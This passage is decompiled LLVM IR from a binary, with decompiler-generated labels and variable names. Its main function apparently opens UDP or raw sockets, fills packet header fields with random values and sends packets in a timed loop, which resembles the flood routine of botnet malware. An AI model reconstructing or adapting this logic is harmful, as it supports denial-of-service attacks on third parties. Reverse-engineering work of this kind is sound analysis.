  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 34, 31, 35, 36, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 45, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 21, 22, 23, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 ptrtoint ([14 x i8*]* @global_var_20234.102 to i32), { 0, 2, 1, 3 }
  uselistorder i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16d74.100, i32 0, i32 0), { 1, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_16d74.100 to i32), { 1, 0, 2, 3 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_16d68.98 to i32), { 1, 0, 2 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_16d64.96 to i32*), { 1, 0 }
  uselistorder [3 x i8]* @global_var_16d64.96, { 1, 0 }
  uselistorder i32 ptrtoint ([17 x i8*]* @global_var_20228.94 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_a4ec, { 0, 2, 1 }
  uselistorder i32 10000, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_a37c, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ae78, { 15, 14, 13, 12, 11, 2, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i8 3, { 1, 0, 2 }
  uselistorder i32 -156, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 32, 4, 7, 8, 9, 10, 11, 12, 3, 13, 14, 15, 28, 29, 30, 31, 2, 16, 17, 18, 19, 20, 21, 1, 22, 23, 0, 24, 25, 26, 6, 27, 5 }
  uselistorder label %dec_label_pc_cccc, { 1, 0 }
  uselistorder label %dec_label_pc_c5c8, { 1, 0 }
  uselistorder label %dec_label_pc_bfcc, { 1, 0 }
  uselistorder label %dec_label_pc_baec, { 1, 0 }
  uselistorder label %dec_label_pc_ba8c, { 1, 0 }
  uselistorder label %dec_label_pc_b974, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b600, { 1, 0 }
  uselistorder label %dec_label_pc_b534, { 1, 0 }
  uselistorder label %dec_label_pc_b320, { 1, 0 }
  uselistorder label %dec_label_pc_b088, { 1, 0 }
  uselistorder label %dec_label_pc_b07c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_afcc, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
}

define i32 @function_cea0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_cea0:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_cea4 = load i32, i32* @r4, align 4
  %v6_cea4 = load i32, i32* @fp, align 4
  store i32 52908, i32* %stack_var_-4, align 4
  %v2_cea8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cea8, i32* @fp, align 4
  %v2_ceac = ptrtoint i32* %stack_var_-136 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_ced4 = icmp eq i32 %arg2, 0
  br i1 %v2_ced4, label %dec_label_pc_cedc, label %dec_label_pc_cefc

dec_label_pc_cedc:                                ; preds = %dec_label_pc_cea0
  %v0_cedc = call i32 @function_8400()
  %v3_cee4 = mul i32 %v0_cedc, 65536
  store i32 %v3_cee4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cf20

dec_label_pc_cefc:                                ; preds = %dec_label_pc_cea0
  %v3_cf04 = urem i32 %arg2, 65536
  store i32 %v3_cf04, i32* %r3.global-to-local, align 4
  %v1_cf0c = call i32 @function_12434(i32 %v3_cf04)
  br label %dec_label_pc_cf20

dec_label_pc_cf20:                                ; preds = %dec_label_pc_cedc, %dec_label_pc_cefc
  %v2_cf24 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_cf24, i32* %r3.global-to-local, align 4
  %v3_cf30 = call i32 @function_9680(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_cf30, i32* %r3.global-to-local, align 4
  %v2_cf38 = icmp eq i32 %v3_cf30, 0
  br i1 %v2_cf38, label %dec_label_pc_cf40, label %dec_label_pc_d4ac

dec_label_pc_cf40:                                ; preds = %dec_label_pc_cf20
  %v2_cf40 = ptrtoint i32* %stack_var_-76 to i32
  %v2_cf44 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cf44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_cf64 = icmp eq i32 %arg4, 32
  br i1 %v7_cf64, label %dec_label_pc_cf6c, label %dec_label_pc_d094

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf40
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cf78 = call i32 @function_1263c(i32 2, i32 2, i32 17)
  store i32 %v3_cf78, i32* %r3.global-to-local, align 4
  %v2_cf88 = icmp eq i32 %v3_cf78, 0
  br i1 %v2_cf88, label %dec_label_pc_d4ac, label %dec_label_pc_cf90

dec_label_pc_cf90:                                ; preds = %dec_label_pc_cf6c
  %v3_cf90 = load i32, i32* %stack_var_0, align 4
  %v1_cf94 = add i32 %v3_cf90, 1
  store i32 %v1_cf94, i32* %r3.global-to-local, align 4
  %v1_cf9c = call i32 @function_127d4(i32 %v1_cf94)
  store i32 %v1_cf9c, i32* %r3.global-to-local, align 4
  %v2_cfac = icmp eq i32 %v1_cf9c, 0
  br i1 %v2_cfac, label %dec_label_pc_d4ac, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_cf90
  %v3_cfb4 = load i32, i32* %stack_var_0, align 4
  %v1_cfb8 = add i32 %v3_cfb4, 1
  store i32 %v1_cfb8, i32* @r2, align 4
  store i32 %v1_cf9c, i32* %r3.global-to-local, align 4
  %v2_cfcc = inttoptr i32 %v1_cf9c to i8*
  %v3_cfcc = call i32 @function_11d70(i8* %v2_cfcc, i32 0)
  %v2_cfd8 = call i32 @function_9a64(i32 %v1_cf9c, i32 %v3_cfb4)
  %v2_cfe0 = call i32 @function_1096c(i32* null)
  %v2_cfec = add i32 %v2_cfe0, %arg3
  store i32 %v2_cfec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v6_d024 = inttoptr i32 %v1_cf9c to i32*
  br label %dec_label_pc_d000

dec_label_pc_d000:                                ; preds = %dec_label_pc_d084, %dec_label_pc_d078, %dec_label_pc_cfb4
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_cfb4 ], [ 0, %dec_label_pc_d078 ], [ %v1_d088, %dec_label_pc_d084 ]
  %v3_d000 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_cf40, i32* %stack_var_-136, align 4
  store i32 %v3_d000, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_d024 = call i32 @function_125d8(i32 %v3_cf78, i32* %v6_d024, i32 %v3_d000, i32 0, i32 %v2_cf40, i32 16)
  store i32 %stack_var_-104.0, i32* %r3.global-to-local, align 4
  %v9_d030 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_d030, label %dec_label_pc_d038, label %dec_label_pc_d084

dec_label_pc_d038:                                ; preds = %dec_label_pc_d000
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ced4, label %dec_label_pc_d044, label %dec_label_pc_d060

dec_label_pc_d044:                                ; preds = %dec_label_pc_d038
  %v0_d044 = call i32 @function_8400()
  %v3_d050 = udiv i32 %v0_d044, 256
  %v3_d0585 = urem i32 %v3_d050, 256
  store i32 %v3_d0585, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d060

dec_label_pc_d060:                                ; preds = %dec_label_pc_d038, %dec_label_pc_d044
  %v2_d064 = call i32 @function_1096c(i32* null)
  store i32 %v2_d064, i32* %r2.global-to-local, align 4
  store i32 %v2_cfec, i32* %r3.global-to-local, align 4
  %v8_d074 = icmp sgt i32 %v2_d064, %v2_cfec
  br i1 %v8_d074, label %dec_label_pc_d4ac, label %dec_label_pc_d078

dec_label_pc_d078:                                ; preds = %dec_label_pc_d060
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d000

dec_label_pc_d084:                                ; preds = %dec_label_pc_d000
  %v1_d088 = add i32 %stack_var_-104.0, 1
  store i32 %v1_d088, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d000

dec_label_pc_d094:                                ; preds = %dec_label_pc_cf40
  store i32 %v2_ceac, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d0a8 = call i32 @function_1263c(i32 2, i32 3, i32 17)
  store i32 %v3_d0a8, i32* %r3.global-to-local, align 4
  %v2_d0b8 = icmp eq i32 %v3_d0a8, 0
  br i1 %v2_d0b8, label %dec_label_pc_d4a8, label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d094
  store i32 1, i32* %stack_var_-80, align 4
  %v2_d0cc = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-136, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_d0cc, i32* %r3.global-to-local, align 4
  %v6_d0e8 = call i32 @function_1260c(i32 %v3_d0a8, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_d0e8, i32* %r3.global-to-local, align 4
  %v1_d0f0 = icmp slt i32 %v6_d0e8, 0
  br i1 %v1_d0f0, label %dec_label_pc_d4a8, label %dec_label_pc_d0fc

dec_label_pc_d0fc:                                ; preds = %dec_label_pc_d0c4
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d108

dec_label_pc_d108:                                ; preds = %dec_label_pc_d0fc, %dec_label_pc_d108
  %v1_d14024 = phi i32 [ 49, %dec_label_pc_d0fc ], [ %v1_d140, %dec_label_pc_d108 ]
  %v2_d10c = call i32 @function_1096c(i32* null)
  store i32 %v2_d10c, i32* %r3.global-to-local, align 4
  store i32 %v2_d10c, i32* @r4, align 4
  %v0_d118 = call i32 @function_8400()
  %v0_d120 = load i32, i32* @r4, align 4
  %v2_d120 = xor i32 %v0_d120, %v0_d118
  store i32 %v2_d120, i32* %r3.global-to-local, align 4
  %v1_d128 = call i32 @function_12ec0(i32 %v2_d120)
  %v0_d12c = call i32 @function_12d1c()
  store i32 %v0_d12c, i32* %r3.global-to-local, align 4
  %v1_d138 = call i32 @function_832c(i32 %v0_d12c)
  %v1_d140 = add nsw i32 %v1_d14024, -1
  store i32 %v1_d140, i32* %r3.global-to-local, align 4
  %v3_d14c = icmp eq i32 %v1_d14024, 0
  br i1 %v3_d14c, label %dec_label_pc_d154, label %dec_label_pc_d108

dec_label_pc_d154:                                ; preds = %dec_label_pc_d108
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_d158 = icmp eq i32 %arg4, 0
  br i1 %v2_d158, label %dec_label_pc_d184, label %dec_label_pc_d16c

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d154
  %v1_d170 = sub i32 32, %arg4
  store i32 %v1_d170, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d17c = shl i32 -1, %v1_d170
  br label %dec_label_pc_d184

dec_label_pc_d184:                                ; preds = %dec_label_pc_d154, %dec_label_pc_d16c
  %storemerge12 = phi i32 [ %v1_d17c, %dec_label_pc_d16c ], [ 0, %dec_label_pc_d154 ]
  %v3_d184 = load i32, i32* %stack_var_0, align 4
  %v1_d188 = add i32 %v3_d184, 28
  %v1_d198 = add i32 %v3_d184, 34
  %v3_d19c = and i32 %v1_d198, -4
  %v1_d1a4 = load i32, i32* @sp, align 4
  %v2_d1a4 = sub i32 %v1_d1a4, %v3_d19c
  %v1_d1a8 = add i32 %v2_d1a4, 8
  store i32 %v1_d1a8, i32* %r2.global-to-local, align 4
  %v1_d1b4 = add i32 %v2_d1a4, 11
  %v3_d1b8 = and i32 %v1_d1b4, -4
  %v1_d1d8 = add i32 %v3_d1b8, 20
  store i32 %v1_d1d8, i32* %r3.global-to-local, align 4
  %v5_d1dc = inttoptr i32 %v1_d1d8 to i8*
  %v3_d1e0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_d1e0, i32* @r4, align 4
  %v1_d1e8 = call i32 @function_aa9c(i32 %storemerge12)
  store i32 %v1_d1e8, i32* %r3.global-to-local, align 4
  %v1_d1f4 = call i32 @function_12410(i32 %v1_d1e8)
  store i32 %v1_d1f4, i32* %r2.global-to-local, align 4
  %v3_d1fc = load i32, i32* %stack_var_0, align 4
  %v1_d200 = add i32 %v3_d1fc, 8
  %v1_d204 = load i32, i32* @sp, align 4
  %v2_d204 = inttoptr i32 %v1_d204 to i32*
  store i32 %v1_d200, i32* %v2_d204, align 4
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_d214 = inttoptr i32 %v3_d1b8 to i8*
  %v5_d214 = call i32 @function_ad64(i8* %v4_d214, i32 %v0_d20c, i32 %v1_d1f4, i32 17)
  %v3_d218 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_d218, 8
  %v3_d22c = urem i32 %fold, 65536
  store i32 %v3_d22c, i32* %r3.global-to-local, align 4
  %v1_d234 = call i32 @function_12434(i32 %v3_d22c)
  %sext = mul i32 %v1_d234, 16777216
  %v1_d238 = sdiv i32 %sext, 16777216
  store i32 %v1_d238, i32* %r3.global-to-local, align 4
  store i32 %v1_d1d8, i32* %r2.global-to-local, align 4
  %v1_d240 = trunc i32 %v1_d238 to i8
  %v3_d240 = add i32 %v3_d1b8, 24
  %v4_d240 = inttoptr i32 %v3_d240 to i8*
  store i8 %v1_d240, i8* %v4_d240, align 4
  %v0_d244 = load i32, i32* %r3.global-to-local, align 4
  %v3_d244 = sdiv i32 %v0_d244, 256
  store i32 %v3_d244, i32* %r3.global-to-local, align 4
  %v1_d248 = trunc i32 %v3_d244 to i8
  %v2_d248 = load i32, i32* %r2.global-to-local, align 4
  %v3_d248 = add i32 %v2_d248, 5
  %v4_d248 = inttoptr i32 %v3_d248 to i8*
  store i8 %v1_d248, i8* %v4_d248, align 1
  %v0_d24c = call i32 @function_8400()
  %v3_d258 = urem i32 %v0_d24c, 65536
  store i32 %v3_d258, i32* %r3.global-to-local, align 4
  store i32 %v1_d1d8, i32* %r2.global-to-local, align 4
  %v1_d260 = trunc i32 %v0_d24c to i8
  store i8 %v1_d260, i8* %v5_d1dc, align 4
  %v0_d264 = load i32, i32* %r3.global-to-local, align 4
  %v3_d26432 = udiv i32 %v0_d264, 256
  %v1_d268 = trunc i32 %v3_d26432 to i8
  %v2_d268 = load i32, i32* %r2.global-to-local, align 4
  %v3_d268 = add i32 %v2_d268, 1
  %v4_d268 = inttoptr i32 %v3_d268 to i8*
  store i8 %v1_d268, i8* %v4_d268, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ced4, label %dec_label_pc_d278, label %dec_label_pc_d290

dec_label_pc_d278:                                ; preds = %dec_label_pc_d184
  %v0_d278 = call i32 @function_8400()
  %v3_d280 = mul i32 %v0_d278, 65536
  store i32 %v3_d280, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_d278 to i8
  br label %dec_label_pc_d2ac

dec_label_pc_d290:                                ; preds = %dec_label_pc_d184
  %v3_d298 = urem i32 %arg2, 65536
  store i32 %v3_d298, i32* %r3.global-to-local, align 4
  %v1_d2a0 = call i32 @function_12434(i32 %v3_d298)
  %extract.t90 = trunc i32 %v1_d2a0 to i8
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d290
  %v0_d278.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_d278 ], [ %extract.t90, %dec_label_pc_d290 ]
  %v3_d3bc.pre-phi = phi i32 [ 0, %dec_label_pc_d278 ], [ %v3_d298, %dec_label_pc_d290 ]
  store i32 %v1_d1d8, i32* %r2.global-to-local, align 4
  %v4_d2b0 = sext i8 %v0_d278.sink.off0 to i32
  %v3_d2b4 = add i32 %v3_d1b8, 22
  %v4_d2b4 = inttoptr i32 %v3_d2b4 to i8*
  store i8 %v0_d278.sink.off0, i8* %v4_d2b4, align 2
  %v3_d2bc36 = udiv i32 %v4_d2b0, 256
  %v1_d2c0 = trunc i32 %v3_d2bc36 to i8
  %v2_d2c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2c0 = add i32 %v2_d2c0, 3
  %v4_d2c0 = inttoptr i32 %v3_d2c0 to i8*
  store i8 %v1_d2c0, i8* %v4_d2c0, align 1
  store i32 %v1_d1d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d2cc = add i32 %v3_d1b8, 26
  %v4_d2cc = inttoptr i32 %v3_d2cc to i8*
  store i8 0, i8* %v4_d2cc, align 2
  %v0_d2d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_d2d0 = trunc i32 %v0_d2d0 to i8
  %v2_d2d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d2d0 = add i32 %v2_d2d0, 7
  %v4_d2d0 = inttoptr i32 %v3_d2d0 to i8*
  store i8 %v1_d2d0, i8* %v4_d2d0, align 1
  %v1_d2d8 = add i32 %v3_d1b8, 28
  store i32 %v1_d2d8, i32* %r3.global-to-local, align 4
  %v3_d2e0 = load i32, i32* %stack_var_0, align 4
  %v2_d2e4 = call i32 @function_9a64(i32 %v1_d2d8, i32 %v3_d2e0)
  %v1_d2f4 = or i32 %v3_d1b8, 2
  store i32 %v1_d2f4, i32* %r3.global-to-local, align 4
  %v1_d2f8 = inttoptr i32 %v1_d2f4 to i8*
  %v2_d2f8 = load i8, i8* %v1_d2f8, align 2
  %v3_d2f8 = zext i8 %v2_d2f8 to i32
  store i32 %v3_d2f8, i32* %r2.global-to-local, align 4
  %v1_d2fc = or i32 %v1_d1b4, 3
  %v2_d2fc = inttoptr i32 %v1_d2fc to i8*
  %v3_d2fc = load i8, i8* %v2_d2fc, align 1
  %v4_d2fc = zext i8 %v3_d2fc to i32
  %v4_d300 = mul nuw nsw i32 %v4_d2fc, 256
  %v5_d300 = or i32 %v4_d300, %v3_d2f8
  store i32 %v5_d300, i32* %r3.global-to-local, align 4
  %v3_d30c = call i32 @function_aafc(i8* %v4_d214, i32 %v5_d300)
  %sext6 = mul i32 %v3_d30c, 16777216
  %v1_d310 = sdiv i32 %sext6, 16777216
  store i32 %v1_d310, i32* %r3.global-to-local, align 4
  store i32 %v3_d1b8, i32* %r2.global-to-local, align 4
  %v1_d318 = trunc i32 %v1_d310 to i8
  %v3_d318 = add i32 %v3_d1b8, 10
  %v4_d318 = inttoptr i32 %v3_d318 to i8*
  store i8 %v1_d318, i8* %v4_d318, align 2
  %v0_d31c = load i32, i32* %r3.global-to-local, align 4
  %v3_d31c = sdiv i32 %v0_d31c, 256
  store i32 %v3_d31c, i32* %r3.global-to-local, align 4
  %v1_d320 = trunc i32 %v3_d31c to i8
  %v2_d320 = load i32, i32* %r2.global-to-local, align 4
  %v3_d320 = add i32 %v2_d320, 11
  %v4_d320 = inttoptr i32 %v3_d320 to i8*
  store i8 %v1_d320, i8* %v4_d320, align 1
  %v2_d328 = call i32 @function_1096c(i32* null)
  %v2_d334 = add i32 %v2_d328, %arg3
  store i32 %v2_d334, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d3fc = add i32 %v3_d1b8, 4
  %v4_d3fc = inttoptr i32 %v3_d3fc to i8*
  %v2_d424 = add i32 %v3_d1b8, 12
  %v3_d424 = inttoptr i32 %v2_d424 to i32*
  br label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %dec_label_pc_d498, %dec_label_pc_d48c, %dec_label_pc_d2ac
  %stack_var_-100.0 = phi i32 [ 0, %dec_label_pc_d2ac ], [ 0, %dec_label_pc_d48c ], [ %v1_d49c, %dec_label_pc_d498 ]
  store i32 %v3_d1b8, i32* %r2.global-to-local, align 4
  %v1_d350 = load i32, i32* @sp, align 4
  %v2_d350 = inttoptr i32 %v1_d350 to i32*
  store i32 %v2_cf40, i32* %v2_d350, align 4
  %v1_d358 = load i32, i32* @sp, align 4
  %v2_d358 = add i32 %v1_d358, 4
  %v3_d358 = inttoptr i32 %v2_d358 to i32*
  store i32 16, i32* %v3_d358, align 4
  %v0_d360 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d188, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_d36c = inttoptr i32 %v0_d360 to i32*
  %v7_d36c = call i32 @function_125d8(i32 %v3_d0a8, i32* %v6_d36c, i32 %v1_d188, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_d370 = call i32 @function_8400()
  %v3_d37c = urem i32 %v0_d370, 65536
  store i32 %v3_d37c, i32* %r3.global-to-local, align 4
  store i32 %v1_d1d8, i32* %r2.global-to-local, align 4
  %v1_d384 = trunc i32 %v0_d370 to i8
  store i8 %v1_d384, i8* %v5_d1dc, align 4
  %v0_d388 = load i32, i32* %r3.global-to-local, align 4
  %v3_d38837 = udiv i32 %v0_d388, 256
  %v1_d38c = trunc i32 %v3_d38837 to i8
  %v2_d38c = load i32, i32* %r2.global-to-local, align 4
  %v3_d38c = add i32 %v2_d38c, 1
  %v4_d38c = inttoptr i32 %v3_d38c to i8*
  store i8 %v1_d38c, i8* %v4_d38c, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_ced4, label %dec_label_pc_d39c, label %dec_label_pc_d3b4

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d348
  %v0_d39c = call i32 @function_8400()
  %v3_d3a4 = mul i32 %v0_d39c, 65536
  store i32 %v3_d3a4, i32* %r3.global-to-local, align 4
  %extract.t91 = trunc i32 %v0_d39c to i8
  br label %dec_label_pc_d3d0

dec_label_pc_d3b4:                                ; preds = %dec_label_pc_d348
  store i32 %v3_d3bc.pre-phi, i32* %r3.global-to-local, align 4
  %v1_d3c4 = call i32 @function_12434(i32 %v3_d3bc.pre-phi)
  %extract.t92 = trunc i32 %v1_d3c4 to i8
  br label %dec_label_pc_d3d0

dec_label_pc_d3d0:                                ; preds = %dec_label_pc_d39c, %dec_label_pc_d3b4
  %v0_d39c.sink.off0 = phi i8 [ %extract.t91, %dec_label_pc_d39c ], [ %extract.t92, %dec_label_pc_d3b4 ]
  store i32 %v1_d1d8, i32* %r2.global-to-local, align 4
  %v4_d3d4 = sext i8 %v0_d39c.sink.off0 to i32
  store i8 %v0_d39c.sink.off0, i8* %v4_d2b4, align 2
  %v3_d3e0 = sdiv i32 %v4_d3d4, 256
  store i32 %v3_d3e0, i32* %r3.global-to-local, align 4
  %v1_d3e4 = trunc i32 %v3_d3e0 to i8
  %v2_d3e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3e4 = add i32 %v2_d3e4, 3
  %v4_d3e4 = inttoptr i32 %v3_d3e4 to i8*
  store i8 %v1_d3e4, i8* %v4_d3e4, align 1
  %v0_d3e8 = call i32 @function_8400()
  %v3_d3f4 = urem i32 %v0_d3e8, 65536
  store i32 %v3_d3f4, i32* %r3.global-to-local, align 4
  store i32 %v3_d1b8, i32* %r2.global-to-local, align 4
  %v1_d3fc = trunc i32 %v0_d3e8 to i8
  store i8 %v1_d3fc, i8* %v4_d3fc, align 4
  %v0_d400 = load i32, i32* %r3.global-to-local, align 4
  %v3_d400 = sdiv i32 %v0_d400, 256
  store i32 %v3_d400, i32* %r3.global-to-local, align 4
  %v1_d404 = trunc i32 %v3_d400 to i8
  %v2_d404 = load i32, i32* %r2.global-to-local, align 4
  %v3_d404 = add i32 %v2_d404, 5
  %v4_d404 = inttoptr i32 %v3_d404 to i8*
  store i8 %v1_d404, i8* %v4_d404, align 1
  %v1_d40c = call i32 @function_aa9c(i32 %storemerge12)
  store i32 %v1_d40c, i32* %r3.global-to-local, align 4
  %v1_d418 = call i32 @function_12410(i32 %v1_d40c)
  store i32 %v1_d418, i32* %r2.global-to-local, align 4
  store i32 %v1_d418, i32* %v3_d424, align 4
  store i32 %v1_d2f4, i32* %r3.global-to-local, align 4
  %v2_d438 = load i8, i8* %v1_d2f8, align 2
  %v3_d438 = zext i8 %v2_d438 to i32
  store i32 %v3_d438, i32* %r2.global-to-local, align 4
  %v3_d43c = load i8, i8* %v2_d2fc, align 1
  %v4_d43c = zext i8 %v3_d43c to i32
  %v4_d440 = mul nuw nsw i32 %v4_d43c, 256
  %v5_d440 = or i32 %v4_d440, %v3_d438
  store i32 %v5_d440, i32* %r3.global-to-local, align 4
  %v3_d44c = call i32 @function_aafc(i8* %v4_d214, i32 %v5_d440)
  %sext7 = mul i32 %v3_d44c, 16777216
  %v1_d450 = sdiv i32 %sext7, 16777216
  store i32 %v1_d450, i32* %r3.global-to-local, align 4
  store i32 %v3_d1b8, i32* %r2.global-to-local, align 4
  %v1_d458 = trunc i32 %v1_d450 to i8
  store i8 %v1_d458, i8* %v4_d318, align 2
  %v0_d45c = load i32, i32* %r3.global-to-local, align 4
  %v3_d45c41 = udiv i32 %v0_d45c, 256
  %v1_d460 = trunc i32 %v3_d45c41 to i8
  %v2_d460 = load i32, i32* %r2.global-to-local, align 4
  %v3_d460 = add i32 %v2_d460, 11
  %v4_d460 = inttoptr i32 %v3_d460 to i8*
  store i8 %v1_d460, i8* %v4_d460, align 1
  store i32 %stack_var_-100.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_d46c = icmp eq i32 %stack_var_-100.0, %arg6
  br i1 %v9_d46c, label %dec_label_pc_d474, label %dec_label_pc_d498

dec_label_pc_d474:                                ; preds = %dec_label_pc_d3d0
  %v2_d478 = call i32 @function_1096c(i32* null)
  store i32 %v2_d478, i32* %r2.global-to-local, align 4
  store i32 %v2_d334, i32* %r3.global-to-local, align 4
  %v8_d488 = icmp sgt i32 %v2_d478, %v2_d334
  br i1 %v8_d488, label %dec_label_pc_d4a8, label %dec_label_pc_d48c

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d474
  br label %dec_label_pc_d348

dec_label_pc_d498:                                ; preds = %dec_label_pc_d3d0
  %v1_d49c = add i32 %stack_var_-100.0, 1
  store i32 %v1_d49c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d348

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d474, %dec_label_pc_d0c4, %dec_label_pc_d094
  %v12_d4b029 = phi i32 [ %v6_d0e8, %dec_label_pc_d0c4 ], [ 0, %dec_label_pc_d094 ], [ %v2_d478, %dec_label_pc_d474 ]
  br label %dec_label_pc_d4ac

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d060, %dec_label_pc_cf20, %dec_label_pc_cf90, %dec_label_pc_cf6c, %dec_label_pc_d4a8
  %v12_d4b0 = phi i32 [ %v3_cf30, %dec_label_pc_cf20 ], [ 0, %dec_label_pc_cf90 ], [ 0, %dec_label_pc_cf6c ], [ %v12_d4b029, %dec_label_pc_d4a8 ], [ %v2_d064, %dec_label_pc_d060 ]
  store i32 %v3_cea4, i32* @r4, align 4
  store i32 %v6_cea4, i32* @fp, align 4
  ret i32 %v12_d4b0

; uselistorder directives
  uselistorder i32 %v1_d49c, { 1, 0 }
  uselistorder i32 %v1_d450, { 1, 0 }
  uselistorder i32 %v3_d400, { 1, 0 }
  uselistorder i32 %v0_d3e8, { 1, 0 }
  uselistorder i32 %v3_d3e0, { 1, 0 }
  uselistorder i8 %v0_d39c.sink.off0, { 1, 0 }
  uselistorder i32 %v0_d39c, { 1, 0 }
  uselistorder i32 %v0_d370, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 0, 2, 1 }
  uselistorder i32 %v2_d334, { 1, 0, 2 }
  uselistorder i32 %v3_d31c, { 1, 0 }
  uselistorder i32 %v1_d310, { 1, 0 }
  uselistorder i32 %v1_d2f4, { 0, 2, 1 }
  uselistorder i32 %v3_d3bc.pre-phi, { 1, 0 }
  uselistorder i8 %v0_d278.sink.off0, { 1, 0 }
  uselistorder i32 %v3_d298, { 2, 1, 0 }
  uselistorder i32 %v0_d278, { 1, 0 }
